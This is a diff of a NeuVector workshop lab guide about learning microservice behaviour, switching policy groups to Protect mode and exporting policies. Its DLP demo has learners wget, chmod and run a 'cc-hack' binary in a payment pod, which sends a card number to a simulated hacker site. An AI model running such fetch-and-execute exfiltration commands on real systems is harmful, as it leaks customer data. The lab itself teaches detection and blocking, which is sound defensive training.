@@ -1,6 +1,6 @@
 # Lab 2 - Exploring Learning Behaviour of NeuVector
 
-In this lab, we will experience first hand NeuVector capability to learn application behaviour of any microservices application, automatically discover all the valid east-west network traffic within the cluster, and generate the security code as Kubernetes CRD resources. We will also detect attack using Data Loss Prevention technique of NeuVector an exciting usecase for our micro-services boutique application.  
+In this lab, we will experience first hand NeuVector capability to learn application behaviour of any microservices application, automatically discover all the valid east-west network traffic within the cluster, and generate the security code as Kubernetes CRD resources. We will also detect attack using Data Loss Prevention technique of NeuVector an exciting use-case for our micro-services boutique application.  
 
 ### Task 1 - Observe the application behaviour in NV
 
@@ -116,7 +116,7 @@ In the NV UI - Policy > Group > Add Group
 
 Name = `eshop-demo`
 
-Criteria = `Namespace=eshop-demo`
+Criteria = `namespace=eshop-demo`
 
 ![Group-add-eshop-demo-group](../images/Group-add-eshop-demo-group.PNG)
 
@@ -159,50 +159,80 @@ We will now impersonate as hacker to steal the data.
 For next step, we will switch to Rancher UI. 
 
 1. Switch to Rancher UI
-   1. Locate the pod "eshop...payment service", open the menu (execute shell)
-   2. Key in the command script like above.
-   3. This download the cc-hack agent into the pod, got executed. A customer's credit card number will then be sent to the hacker's site. And the hacker site will respond the same credit card number back to the agent.
+
+   Cluster 2 > Workload > Pods > Filter `payment`> right click on 3 vertical dots > Execute Shell
+
+   ![RancherUI-payment-service-execute-shall-pg1](../images/RancherUI-payment-service-execute-shall-pg1.PNG)
+
+   
+
+   This download the cc-hack agent into the pod, got executed. A customer's credit card number will then be sent to the hacker's site. And the hacker site will respond the same credit card number back to the agent.
+
+   Key in the command script like above.
+
+   `wget https://rancherworkshop.blob.core.windows.net/demoapp/cc-hack`
+   `chmod +x cc-hack`
+   `./cc-hack`
+
+   ![RancherUI-payment-service-execute-shell-pg2](../images/RancherUI-payment-service-execute-shell-pg2-1669654522523-29-1669654723600-31.PNG)
+
+   
+
+   Switch back to NeuVector UI to see if we are getting any Security Risk Event NeuVector > Notification > Security Events > Filter `DLP`. You should notice the "card violation rule..."
+
+![NeuVector-Notification-DLP-Event-pg1](../images/NeuVector-Notification-DLP-Event-pg1.PNG)
+
+To inspect the payload, you can click on `Show Packet`. You can even download the packet capture by clicking on `DOWNLOAD PCAP`
+
+![NeuVector-Notification-DLP-Event-pg2](../images/NeuVector-Notification-DLP-Event-pg2-1669655005102-37.PNG)
 
 
 
+Now let protect the application so this does not happen again. 
 
+NeuVector > Policy > Groups > Filter `eshop`> Select All > Switch Mode >  Select "Protect" mode, and use "Basic" > Click Apply.
 
-`wget https://rancherworkshop.blob.core.windows.net/demoapp/cc-hack`
-`chmod +x cc-hack`
-`./cc-hack`
+![Group-eshop-demo-switch-to-protect-pg1](../images/Group-eshop-demo-switch-to-protect-pg1.PNG)
 
+![Group-eshop-demo-switch-to-protect-pg2](../images/Group-eshop-demo-switch-to-protect-pg2.PNG)
 
+![Group-eshop-demo-switch-to-protect-pg3-success](../images/Group-eshop-demo-switch-to-protect-pg3-success.PNG)
 
+Now, we will need to switch to the Ranch UI, in the same payment service pod, open the shell, execuite the ./cc-hack program. You will get a message that Operation was not permitted as it violated the DLP sensor we had applied on the pods/services in the eshop-demo namespace. 
 
+![RancherUI-payment-service-execute-shell-protect-mode-result](../images/RancherUI-payment-service-execute-shell-protect-mode-result.PNG)
 
-1. Switch to NV UI
-   1. Navigate to the Notification > Security Events menu item inthe left navigation bar,
-   2. You should notice the "card violation rule..."
-2. In the same NV UI,
-   1. In the Group, filter by "eshop", check all the pods in namespace eshop-demo. Click Switch Mode button. Change from "Monitor" mode to "Protect" mode. Use "Basic". Click Apply.
-3. Switch to the Ranch UI, in the same payment service pod, open the shell, execuite the ./cc-hack program. It should have been killed right away as protected by NV.
-4. Same notification in NV security events UI will also be alerted.
-5. Further to this, we can define response rules on the security events to notify the operator in case those "interesting" events are being triggered. (Beyond the scope of this workshop, ask our solution architct if yo are interested.)
+Let's check on what notification we get in NeuVector. 
 
-In the security events of "card violation rule", click the "View packet" to show the details of the packet and examine which card has been exposed.
-
-Export the Application Lean Behaviour to new clusters (steps
-
-)
-
-If you wish to add DLP & WAF Rules, 
-
-![Cluster1-NeuVector-Policy-Add-DLP-WAF](../images/Cluster1-NeuVector-Policy-Add-DLP-WAF.png)
-
-DLP Rule added
-
-![Cluster1-NeuVector-Policy-DLP](../images/Cluster1-NeuVector-Policy-DLP.PNG)
+![NeuVectorUI-group-protect-mode-result](../images/NeuVectorUI-group-protect-mode-result.PNG)
 
 
 
-WAF Rules
+Further to this, we can define response rules on the security events to notify the operator in case those "interesting" events are being triggered. (Beyond the scope of this workshop)
 
-![Cluster1-NeuVector-Policy-WAF](../images/Cluster1-NeuVector-Policy-WAF.PNG)
+We have now learned our application behaviour and created a security profile. We can easily import & export these to new clusters we on-board. 
+
+NeuVector > Policy > Groups > Filter `eshop`> Select All > Export Group Policy > dropdown > click on `Protect`
+
+![NeuVector-eshop-app-security-policy-export-pg1](../images/NeuVector-eshop-app-security-policy-export-pg1.PNG)
+
+A policy file with YAML extension will be downloaded to your local drive. 
+
+You can import these on your other cluster to build the same security policy for your application which will be on day zero have the application in the protect mode. 
+
+NeuVector UI(Cluster 1) > Policy > Groups > `IMPORT GROUP POLICY` 
+
+![NeuVector-eshop-app-security-policy-export-pg2-cluste1](../images/NeuVector-eshop-app-security-policy-export-pg2-cluste1.PNG)
+
+![NeuVector-eshop-app-security-policy-export-pg3-cluster1](../images/NeuVector-eshop-app-security-policy-export-pg3-cluster1.PNG)
+
+You can choose to drop the file or upload from the chosen location & click `UPLOAD`
+
+![NeuVector-eshop-app-security-policy-export-pg4-cluster1](../images/NeuVector-eshop-app-security-policy-export-pg4-cluster1.PNG)
+
+Upon successful import, you will see the message below on the right hand bottom corner. 
+
+![NeuVector-eshop-app-security-policy-export-pg5-cluster1-successful](../images/NeuVector-eshop-app-security-policy-export-pg5-cluster1-successful.PNG)
 
 
 
